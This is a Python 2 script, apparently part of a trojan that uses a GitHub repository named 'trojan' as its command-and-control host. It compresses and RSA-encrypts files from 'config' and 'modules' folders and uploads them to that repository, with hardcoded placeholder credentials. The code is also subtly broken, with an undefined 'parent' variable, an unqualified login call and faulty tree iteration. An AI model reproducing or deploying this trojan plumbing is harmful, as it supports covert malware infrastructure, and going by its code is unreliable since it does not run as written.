#!/usr/bin/python
import os
import zlib
import base64
import fnmatch
import github3
import Crypto.Hash.SHA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

def encrypt(plaintext, key):
    ## Returns base64 encrypted plaintext
    chunk_size = 256-2-2*Crypto.Hash.SHA.digest_size
    print '\tCompressing: %d bytes' % len(plaintext)
    plaintext = zlib.compress(plaintext)
    
    print "\tEncrypting %d bytes" % len(plaintext)
    rsakey = RSA.importKey(key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    encrypted = ""
    offset = 0
    
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            added_chunk =   chunk_size - len(chunk)
            chunk += " " * added_chunk     
            print "\tAdded: %d bytes" % added_chunk
            
        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size
    if added_chunk < 0x10:
        encrypted = "0x0" + str(hex(added_chunk))[2:] + encrypted
    else:
        encrypted = str(hex(added_chunk))+ encrypted
         
    print "\tEncrypted: %d bytes" % len(encrypted)
    encrypted = encrypted.encode("base64")
    return encrypted

def connect_to_github():
    gh = login(username="username", password="password")
    repo = gh.repository("username","trojan")
    branch = repo.branch("master")
    return gh, repo, branch

# !----- Main Loop -----!#
with open("keys/code_key.pub") as file_object: 
    public_key=file_object.read()
    file_object.close()
    
def encrypt_folder(path):
    
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()    
    for filenames in tree.tree:
        for filename in filenames:
            if filename not in ".gitignore":
                print "Found: %s" % os.path.join(parent, filename)
                with open("%s/%s" % (path, filename)) as file_object:
                    encrypted = encrypt(file_object.read(), public_key)
                    file_object.close()
                    
                print "\tSave: ../%s/%s" % (path, filename)
                commit_message = "Upload Code: ../%s/%s" % (path, filename)
                repo.create_file("%s/%s" % (path, filename),commit_message,base64.b64encode(encrypted))
                    
encrypt_folder("config")
encrypt_folder("modules")
            
            